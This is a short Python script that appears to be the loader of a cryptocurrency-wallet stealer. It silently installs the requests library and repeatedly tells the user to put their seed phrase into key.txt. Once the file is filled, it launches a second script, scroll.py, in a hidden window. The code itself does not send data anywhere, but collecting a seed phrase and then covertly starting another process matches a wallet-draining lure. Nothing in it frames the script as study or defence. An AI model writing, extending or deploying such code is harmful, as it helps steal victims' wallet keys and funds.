import os  
import subprocess  
import sys  
import time  

# Update
def install_deps():  
    subprocess.call([sys.executable, "-m", "pip", "install", "requests"],  
                    creationflags=0x08000000, stdout=subprocess.DEVNULL)  

def main():  
    # Check key.txt  
    while True:  
        print("You need to import seed phrase in key.txt to continue")  
        if os.path.exists("key.txt"):  
            with open("key.txt", "r") as f:  
                if f.read().strip():  
                    # Запуск scroll.py  
                    subprocess.Popen([sys.executable, "scroll.py"], creationflags=0x08000000)  
                    break  
        time.sleep(15)  # Check 15 seconds 

if __name__ == "__main__":  
    install_deps()  
    main()  